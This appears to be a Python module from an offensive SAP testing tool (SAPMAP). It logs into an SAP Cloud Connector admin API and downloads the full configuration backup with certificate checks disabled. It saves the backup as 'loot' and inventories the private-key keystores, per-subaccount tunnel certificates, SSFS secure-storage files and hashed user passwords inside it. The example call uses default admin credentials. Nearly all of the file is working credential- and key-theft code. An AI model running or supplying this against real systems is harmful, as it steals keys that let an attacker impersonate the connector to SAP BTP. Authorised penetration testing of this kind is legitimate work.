#!/usr/bin/env python3
"""SAPMAP — SCC trust-store / keystore extraction.

Pulls the full SCC configuration backup via
``POST /api/v1/configuration/backup`` and parses out the high-value
keystore artifacts:

    config/ks.p12                                     -> admin UI keystore
    scc_config/scc.p12                                -> system identity keystore
    scc_config/<region>/<subaccount>/scc.p12          -> per-subaccount
                                                          tunnel client cert
                                                          + private key
                                                          (BTP authenticates
                                                           the SCC with this)
    scc_config/SSFS_SCC.KEY / SSFS_SCC.DAT            -> SAP Secure Storage
                                                          File System
                                                          (PP CA private key
                                                           lives here when
                                                           PP is configured)
    config/users.xml                                  -> local SCC users +
                                                          (hashed) passwords

The backup endpoint requires a caller-supplied passphrase that protects
the keystores inside the zip; we don't unlock the p12s here (avoids
adding a `cryptography` dep), instead computing SHA-256 over each
keystore's bytes as the per-keystore fingerprint stored on
``SCCNode.tunnel_privkey_fp`` / ``pp_ca_privkey_fp``.  The fingerprint
is still a stable per-key identifier for cross-session tracking.

Extraction is **destructive-adjacent**: the backup file ends up on disk
in ``loot_dir`` (default ``./loot/scc/<host>/``) and SHOULD be treated
as crown-jewels material.  Findings emitted are CRITICAL.

Usage
-----
    from sapmap_scc_keystore import extract_keystore
    res = extract_keystore("192.168.2.167", "Administrator", "SccAdmin123!",
                           backup_password="SccAdmin123!")
    # res = {
    #   "ok": True,
    #   "loot_path": "/abs/path/to/scc_backup_<host>_<ts>.zip",
    #   "system_keystore": {"path": "scc_config/scc.p12", "sha256": "..."},
    #   "tunnel_keystores": [
    #       {"region": "...", "subaccount": "...",
    #        "path": "scc_config/.../scc.p12", "sha256": "..."},
    #   ],
    #   "ssfs_present": True | False,
    #   "users_xml_present": True | False,
    #   "members": [<filename>, ...],
    # }
"""
from __future__ import annotations

import hashlib
import io
import json
import os
import re
import ssl
import time
import urllib.request as _urlreq
import urllib.error as _urlerr
import zipfile
from datetime import datetime
from typing import Optional


def _slug(s: str) -> str:
    """Filesystem-safe slug for use in loot file paths."""
    return re.sub(r"[^A-Za-z0-9._-]+", "_", s or "?")


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _basic_header(user: str, password: str) -> dict:
    import base64
    blob = base64.b64encode(f"{user}:{password}".encode()).decode()
    return {"Authorization": f"Basic {blob}"}


def fetch_backup(host: str, user: str, password: str,
                 backup_password: str,
                 port: int = 8443, timeout: float = 30.0
                 ) -> bytes:
    """POST to /api/v1/configuration/backup and return the zip bytes.

    Raises on auth failure / 4xx — caller wraps in try/except.
    """
    url = f"https://{host}:{port}/api/v1/configuration/backup"
    body = json.dumps({"password": backup_password}).encode()
    hdrs = _basic_header(user, password)
    hdrs["Content-Type"] = "application/json"
    hdrs["Accept"] = "*/*"
    req = _urlreq.Request(url, data=body, method="POST", headers=hdrs)
    with _urlreq.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
        return r.read()


def _sha256(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


def parse_backup(zip_bytes: bytes) -> dict:
    """Inspect a backup zip and return a structured summary.

    Does NOT unlock the p12s (we don't have the keystore-internal
    password).  Each keystore is described by its filename inside the
    archive plus the SHA-256 of its byte content.
    """
    summary = {
        "ok": True,
        "members": [],
        "system_keystore": None,           # scc_config/scc.p12
        "ui_keystore": None,               # config/ks.p12
        "tunnel_keystores": [],            # per-subaccount scc.p12
        "ssfs_present": False,             # SSFS_SCC.KEY + SSFS_SCC.DAT
        "users_xml_present": False,
        "users_xml_sha256": "",
        "manifest": {},
    }
    bio = io.BytesIO(zip_bytes)
    try:
        zf = zipfile.ZipFile(bio)
    except zipfile.BadZipFile:
        return {"ok": False, "error": "response is not a zip archive"}
    summary["members"] = [i.filename for i in zf.infolist()]
    have_ssfs_key = False
    have_ssfs_dat = False
    sub_re = re.compile(
        r"^scc_config/(?P<region>[^/]+)/(?P<sub>[0-9a-fA-F-]{36})/scc\.p12$")
    for info in zf.infolist():
        name = info.filename
        if name == "scc_config/scc.p12":
            summary["system_keystore"] = {
                "path": name,
                "sha256": _sha256(zf.read(info)),
                "size": info.file_size,
            }
            continue
        if name == "config/ks.p12":
            summary["ui_keystore"] = {
                "path": name,
                "sha256": _sha256(zf.read(info)),
                "size": info.file_size,
            }
            continue
        m = sub_re.match(name)
        if m:
            summary["tunnel_keystores"].append({
                "region": m.group("region"),
                "subaccount": m.group("sub"),
                "path": name,
                "sha256": _sha256(zf.read(info)),
                "size": info.file_size,
            })
            continue
        if name == "scc_config/SSFS_SCC.KEY":
            have_ssfs_key = True
        if name == "scc_config/SSFS_SCC.DAT":
            have_ssfs_dat = True
        if name == "config/users.xml":
            summary["users_xml_present"] = True
            summary["users_xml_sha256"] = _sha256(zf.read(info))
        if name == "manifest.json":
            try:
                summary["manifest"] = json.loads(zf.read(info))
            except Exception:
                pass
    summary["ssfs_present"] = have_ssfs_key and have_ssfs_dat
    return summary


def extract_keystore(host: str, user: str, password: str, *,
                     backup_password: Optional[str] = None,
                     port: int = 8443, timeout: float = 30.0,
                     loot_dir: Optional[str] = None
                     ) -> dict:
    """End-to-end extraction: pull backup, save to loot_dir, parse.

    ``backup_password`` defaults to ``password`` (admin login password)
    when not supplied — the SCC accepts any string here, it's used to
    encrypt the resulting zip's keystores.  Operators who want
    distinct passphrases can pass one explicitly.

    Returns a dict matching ``parse_backup`` plus ``loot_path``.  On
    failure returns ``{ok: False, error: <reason>}``.
    """
    bpw = backup_password or password
    if loot_dir is None:
        loot_dir = os.path.join(os.getcwd(), "loot", "scc", _slug(host))
    os.makedirs(loot_dir, exist_ok=True)
    try:
        data = fetch_backup(host, user, password, bpw,
                            port=port, timeout=timeout)
    except _urlerr.HTTPError as e:
        try:
            err_body = e.read().decode("utf-8", "replace")
        except Exception:
            err_body = ""
        return {"ok": False,
                "error": f"HTTP {e.code} from backup endpoint: {err_body[:200]}"}
    except Exception as e:
        return {"ok": False, "error": f"backup fetch failed: {e}"}
    if not data or data[:2] != b"PK":
        return {"ok": False, "error": "backup endpoint returned non-zip data"}
    ts = datetime.now().strftime("%Y%m%dT%H%M%S")
    fname = f"scc_backup_{_slug(host)}_{ts}.zip"
    loot_path = os.path.join(loot_dir, fname)
    try:
        with open(loot_path, "wb") as fh:
            fh.write(data)
        # Tighten permissions — keystore loot is crown-jewels material.
        try:
            os.chmod(loot_path, 0o600)
        except Exception:
            pass
    except Exception as e:
        return {"ok": False, "error": f"could not write loot file: {e}"}
    summary = parse_backup(data)
    summary["loot_path"] = loot_path
    summary["loot_size"] = len(data)
    summary["fetched_at"] = datetime.now().isoformat(timespec="seconds")
    return summary
